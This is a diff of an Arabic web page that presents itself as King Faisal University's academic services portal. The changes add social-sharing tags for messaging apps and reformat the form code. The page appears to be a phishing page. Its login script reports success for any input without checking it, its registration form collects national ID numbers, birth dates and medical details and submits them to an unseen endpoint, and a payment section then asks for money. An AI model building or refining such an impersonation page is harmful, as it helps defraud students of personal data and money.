@@ -5,12 +5,17 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>بوابة الخدمات الأكاديمية - جامعة الملك فيصل</title>
 
-<!-- OG tags لتحسين العرض عند المشاركة -->
+<!-- Open Graph لتليجرام، واتس، فيسبوك -->
 <meta property="og:title" content="جامعة الملك فيصل – بوابة الخدمات الأكاديمية">
-<meta property="og:description" content="التقديم الإلكتروني للطلاب الجدد – نموذج رسمي وآمن للجامعة، يشمل جميع الكليات والتخصصات. قدم طلبك الآن بسهولة وأمان.">
-<meta property="og:image" content="https://i.postimg.cc/YjnPhvjs/ksu-image.jpg">
+<meta property="og:description" content="التقديم الإلكتروني – تسجيل الدخول – الخدمات الأكاديمية للطلاب">
+<meta property="og:image" content="https://i.postimg.cc/kGBVSZ5p/images-6.jpg">
 <meta property="og:type" content="website">
+
+<!-- Twitter Card -->
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="جامعة الملك فيصل – بوابة الخدمات الأكاديمية">
+<meta name="twitter:description" content="التقديم الإلكتروني – تسجيل الدخول – الخدمات الأكاديمية للطلاب">
+<meta name="twitter:image" content="https://i.postimg.cc/kGBVSZ5p/images-6.jpg">
 
 <link rel="icon" type="image/png" href="kfu_logo.png">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -27,7 +32,6 @@
 body{background:var(--bg);color:#222;}
 a{text-decoration:none;color:inherit;}
 button{cursor:pointer;}
-
 .login-container{
 max-width:500px;margin:50px auto;background:linear-gradient(135deg,var(--uf-green),var(--gold));border-radius:14px;padding:30px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.15);}
 .login-header img{width:80px;margin-bottom:12px;}
@@ -111,8 +115,14 @@ textarea{resize:vertical;}
 <label>الاسم الكامل *</label><input type="text" name="fullName" required>
 <label>الجنس *</label><select name="gender" required><option value="">اختر...</option><option>ذكر</option><option>أنثى</option></select>
 <label>الجنسية *</label><select name="nationality" required>
-<option value="">اختر الجنسية</option><option>السعودية</option><option>اليمن</option><option>مصر</option><option>سوريا</option><option>الأردن</option><option>العراق</option><option>لبنان</option><option>فلسطين</option><option>السودان</option><option>تونس</option><option>المغرب</option><option>الإمارات</option><option>الكويت</option><option>البحرين</option><option>عمان</option><option>قطر</option><option>تركيا</option><option>أفغانستان</option><option>باكستان</option><option>الهند</option><option>إندونيسيا</option><option>Other</option></select>
-<label>الدولة (مكان الإقامة) *</label><select name="country" required><option value="">اختر الدولة</option><option>المملكة العربية السعودية</option><option>اليمن</option><option>مصر</option><option>الإمارات</option><option>الكويت</option><option>البحرين</option><option>عمان</option><option>قطر</option><option>الأردن</option><option>سوريا</option><option>لبنان</option><option>السودان</option><option>المغرب</option><option>تونس</option><option>أخرى</option></select>
+<option value="">اختر الجنسية</option>
+<option>السعودية</option><option>اليمن</option><option>مصر</option><option>سوريا</option><option>الأردن</option>
+<option>العراق</option><option>لبنان</option><option>فلسطين</option><option>السودان</option><option>تونس</option>
+<option>المغرب</option><option>الإمارات</option><option>الكويت</option><option>البحرين</option><option>عمان</option>
+<option>قطر</option><option>تركيا</option><option>أفغانستان</option><option>باكستان</option><option>الهند</option>
+<option>إندونيسيا</option><option>Other</option></select>
+<label>الدولة (مكان الإقامة) *</label><select name="country" required>
+<option value="">اختر الدولة</option><option>المملكة العربية السعودية</option><option>اليمن</option><option>مصر</option><option>الإمارات</option><option>الكويت</option><option>البحرين</option><option>عمان</option><option>قطر</option><option>الأردن</option><option>سوريا</option><option>لبنان</option><option>السودان</option><option>المغرب</option><option>تونس</option><option>أخرى</option></select>
 <label>رقم الهوية / الإقامة *</label><input type="text" name="idNumber" required>
 <label>تاريخ الميلاد *</label><input type="date" name="birthDate" required>
 <label>مكان الميلاد (المدينة)</label><input type="text" name="birthPlace">
@@ -123,15 +133,18 @@ textarea{resize:vertical;}
 </div>
 
 <div>
-<label>نوع المؤهل السابق *</label><select name="prevDegree" required><option value="">اختر...</option><option>ثانوي</option><option>دبلوم</option><option>بكالوريوس</option><option>ماجستير</option></select>
+<label>نوع المؤهل السابق *</label><select name="prevDegree" required>
+<option value="">اختر...</option><option>ثانوي</option><option>دبلوم</option><option>بكالوريوس</option><option>ماجستير</option></select>
 <label>سنة التخرج *</label><input type="number" name="gradYear" required>
 <label>اسم المدرسة / الجامعة السابقة</label><input type="text" name="prevInstitute">
 <label>النسبة / المعدل</label><input type="text" name="gpa">
 <label>التخصص المطلوب *</label><input type="text" name="desiredMajor" required>
-<label>نوع الدراسة *</label><select name="studyType" required><option value="">اختر...</option><option>انتظام</option><option>انتساب</option><option>تعليم عن بعد</option></select>
+<label>نوع الدراسة *</label><select name="studyType" required>
+<option value="">اختر...</option><option>انتظام</option><option>انتساب</option><option>تعليم عن بعد</option></select>
 <label>الكلية / القسم *</label><select name="faculty" required>
 <option value="">اختر الكلية</option>
-<option>كلية الطب</option><option>كلية الهندسة</option><option>كلية العلوم</option><option>كلية الآداب</option><option>كلية إدارة الأعمال</option><option>كلية الحاسبات وتقنية المعلومات</option><option>كلية التربية</option><option>كلية القانون</option><option>كلية الصحة العامة</option>
+<option>كلية الطب</option><option>كلية الهندسة</option><option>كلية العلوم</option><option>كلية الآداب</option><option>كلية إدارة الأعمال</option>
+<option>كلية الحاسبات وتقنية المعلومات</option><option>كلية التربية</option><option>كلية القانون</option><option>كلية الصحة العامة</option>
 </select>
 <label>هل لديك أي حالة طبية هامة؟</label><input type="text" name="medicalInfo" placeholder="إن وُجد">
 <div class="section-title">جهة الاتصال في حالات الطوارئ</div>
@@ -197,7 +210,9 @@ function copyAccount(){let copyText=document.getElementById('payerAccount');copy
 function showToast(msg){const toast=document.getElementById('toast');toast.textContent=msg;toast.classList.add('show');setTimeout(()=>toast.classList.remove('show'),2500);}
 
 document.getElementById('loginForm').addEventListener('submit',function(e){
-e.preventDefault();const user=document.getElementById('username').value.trim();const pass=document.getElementById('password').value.trim();
+e.preventDefault();
+const user=document.getElementById('username').value.trim();
+const pass=document.getElementById('password').value.trim();
 if(!user || !pass){showToast('❌ يرجى ملء اسم المستخدم وكلمة المرور');return;}
 showToast('✅ تم تسجيل الدخول');
 });
@@ -207,7 +222,13 @@ e.preventDefault();
 if(hasSubmitted){showToast('❌ لقد تم إرسال بياناتك مسبقاً'); return;}
 const formData=new FormData(this);
 fetch(this.action,{method:'POST',body:formData})
-.then(res=>{if(res.ok){showToast('✅ تم إرسال بياناتك بنجاح');document.getElementById('registrationForm').style.display='none';document.getElementById('paymentSection').style.display='block';hasSubmitted=true;}else showToast('❌ حدث خطأ حاول لاحقاً');}).catch(()=>showToast('❌ فشل الاتصال'));
+.then(res=>{if(res.ok){
+showToast('✅ تم إرسال بياناتك بنجاح');
+document.getElementById('registrationForm').style.display='none';
+document.getElementById('paymentSection').style.display='block';
+hasSubmitted=true;
+}else showToast('❌ حدث خطأ حاول لاحقاً');
+}).catch(()=>showToast('❌ فشل الاتصال'));
 });
 
 document.getElementById('submitPayment').addEventListener('click',function(){
@@ -224,4 +245,4 @@ document.getElementById('successMessage').style.display='block';
 </script>
 
 </body>
-</html>
+  </html>
